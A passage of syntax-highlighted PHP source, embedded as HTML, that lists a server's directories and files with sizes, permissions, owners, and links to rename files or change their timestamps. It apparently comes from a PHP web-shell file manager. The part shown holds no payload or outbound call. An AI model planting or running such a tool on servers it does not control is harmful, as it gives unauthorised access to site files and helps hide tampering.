style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'dirperm'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getPerms(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'fileowner'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getUser(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'dirlink'<\/span>]=$<span style=\"color: #ffcc66;\">nowpath<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>]=$<span style=\"color: #ffcc66;\">filepath<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdata<\/span>[]=$<span style=\"color: #ffcc66;\">dirdb<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {<span style=\"color: #f2777a; background-color: #515151;\">        <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'filename'<\/span>]=$<span style=\"color: #ffcc66;\">file<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'size'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">sizecount(<\/span>@<span style=\"color: #cccccc; background-color: #2d2d2d;\">filesize(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'mtime'<\/span>]=<span style=\"color: #99cc99;\">@date<\/span>(<span style=\"color: #66cccc;\">'Y-m-d H:i:s'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">filemtime(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'filechmod'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getChmod(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'fileperm'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getPerms(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'fileowner'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getUser(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'dirlink'<\/span>]=$<span style=\"color: #ffcc66;\">nowpath<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>]=$<span style=\"color: #ffcc66;\">filepath<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[]=$<span style=\"color: #ffcc66;\">filedb<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">while<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">unset(<\/span>$<span style=\"color: #ffcc66;\">dirdb<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">unset(<\/span>$<span style=\"color: #ffcc66;\">filedb<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">closedir(<\/span>$<span style=\"color: #ffcc66;\">dirs<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">sort(<\/span>$<span style=\"color: #ffcc66;\">dirdata<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">sort(<\/span>$<span style=\"color: #ffcc66;\">filedata<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dir_i<\/span> = <span style=\"color: #66cccc;\">'0'<\/span>;\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;form id=\"filelist\" name=\"filelist\" action=\"'<\/span>.$<span style=\"color: #ffcc66;\">self<\/span>.<span style=\"color: #66cccc;\">'\" method=\"post\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'file'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'thefile'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'doing'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dir'<\/span>,$<span style=\"color: #ffcc66;\">nowpath<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">dirdata<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">key<\/span> =&gt; $<span style=\"color: #ffcc66;\">dirdb<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'filename'<\/span>]!=<span style=\"color: #66cccc;\">'..'<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'filename'<\/span>]!=<span style=\"color: #66cccc;\">'.'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">getdir<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">getdir<\/span> == $<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>]) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">attachsize<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">dirsize(<\/span>$<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>]);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">attachsize<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">is_numeric(<\/span>$<span style=\"color: #ffcc66;\">attachsize<\/span>) ? <span style=\"color: #cccccc; background-color: #2d2d2d;\">sizecount(<\/span>$<span style=\"color: #ffcc66;\">attachsize<\/span>) :<span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Unknown'<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">attachsize<\/span> = <span style=\"color: #66cccc;\">'&lt;a href=\"javascript:getsize(\\''<\/span>.$<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'server_li<\/span><span style=\"color: #66cccc; text-decoration: underline;\">nk'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\',\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dir<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\');\"&gt;Stat&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">thisbg<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"'<\/span>.$<span style=\"color: #ffcc66;\">thisbg<\/span>.<span style=\"color: #66cccc;\">'\" onmouseover=\"this.className=\\'focus\\';\" o<\/span><span style=\"color: #66cccc; text-decoration: underline;\">nmouseout=\"this.className=\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">thisbg<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\';\"&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td width=\"2%\" nowrap&gt;&lt;input name=\"dl[]\" type=\"checkbox\" value=\"'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dirdb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'server_link'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\"&gt;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;&lt;a href=\"javascript:godir(\\''<\/span>.$<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>].<span style=\"color: #66cccc;\">'\\');\"&gt;'<\/span>.<span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dirdb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'filename'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td nowrap&gt;&lt;a href=\"javascript:opfile(\\'newtime\\',\\''<\/span>.$<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'ser<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ver_link'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\',\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dirdb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'dirlink'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\');\"&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dirdb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'mtime'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td nowrap&gt;'<\/span>.$<span style=\"color: #ffcc66;\">attachsize<\/span>.<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td nowrap&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;a href=\"javascript:fileperm(\\''<\/span>.$<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>].<span style=\"color: #66cccc;\">'\\');\"&gt;'<\/span>.$<span style=\"color: #ffcc66; text-decoration: underline;\">dirdb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'dirchmod'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt; \/ '<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;a href=\"javascript:fileperm(\\''<\/span>.$<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>].<span style=\"color: #66cccc;\">'\\');\"&gt;'<\/span>.$<span style=\"color: #ffcc66; text-decoration: underline;\">dirdb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'dirperm'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dirdb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'fileowner'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td nowrap&gt;&lt;a href=\"javascript:rename(\\''<\/span>.$<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>].<span style=\"color: #66cccc;\">'<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\\');\"&gt;Rename&lt;\/a&gt;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dir_i<\/span>++;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'filename'<\/span>]==<span style=\"color: #66cccc;\">'..'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class='<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>).<span style=\"color: #66cccc;\">'&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td align=\"center\"&gt;-&lt;\/td&gt;&lt;td nowrap colspan=\"5\"&gt;&lt;a href=\"java<\/span><span style=\"color: #66cccc; text-decoration: underline;\">script:godir(\\''<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">getUpPath(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">nowpath<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\');\"&gt;Parent Directory&lt;\/a&gt;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr bgcolor=\"#dddddd\" stlye=\"border-top:1px solid #fff;border-bottom:1px <\/span><span style=\"color: #66cccc; text-decoration: underline;\">solid #ddd;\"&gt;&lt;td colspan=\"6\" height=\"5\"&gt;&lt;\/td&gt;&lt;\/tr&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">file_i<\/span> = <span style=\"color: #66cccc;\">'0'<\/span>;\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">filedata<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">key<\/span> =&gt; $<span style=\"color: #ffcc66;\">filedb<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'filename'<\/span>]!=<span style=\"color: #66cccc;\">'..'<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'filename'<\/span>]!=<span style=\"color: #66cccc;\">'.'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fileurl<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span>$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">\"DOCUMENT_ROOT\"<\/span>],<span style=\"color: #66cccc;\">''<\/span>,$<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'server_<\/span><span style=\"color: #66cccc; text-decoration: underline;\">link'<\/span><span style=\"text-decoration: underline;\">]);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">thisbg<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"'<\/span>.$<span style=\"color: #ffcc66;\">thisbg<\/span>.<span style=\"color: #66cccc;\">'\" onmouseover=\"this.className=\\'focus\\';\" o<\/span><span style=\"color: #66cccc; text-decoration: underline;\">nmouseout=\"this.className=\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">thisbg<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\';\"&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td width=\"2%\" nowrap&gt;&lt;input name=\"dl[]\" type=\"checkbox\" value=\"'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">filedb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'server_link'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\"&gt;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.((<span style=\"color: #cccccc; background-color: #2d2d2d;\">strpos(<\/span>$<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'server_link'<\/span>], $<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">\"DOCUMENT_ROOT\"<\/span>])<span style=\"text-decoration: underline;\"> !== <\/span><span style=\"color: #6699cc; text-decoration: underline;\">false<\/span><span style=\"text-decoration: underline;\">) ? <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;a href=\"'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">fileurl<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\" target=\"_blank\"&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">filedb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'filename'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\"> : $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">filedb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'filename'<\/span><span style=\"text-decoration: underline;\">]).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td nowrap&gt;&lt;a href=\"javascript:opfile(\\'newtime\\',\\''<\/span>.$<span style=\"color: #ffcc66;\">filedb<\/span>[<span style=\"color: #66cccc;\">'se<\/span><span style=\"color: #66cccc; text-decoration: underline;\">rver_link'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\',\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">filedb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'dirlink'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\');\"&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">filedb<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'mtime'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td nowrap&gt;'<\/span>.$<span style=\"color: 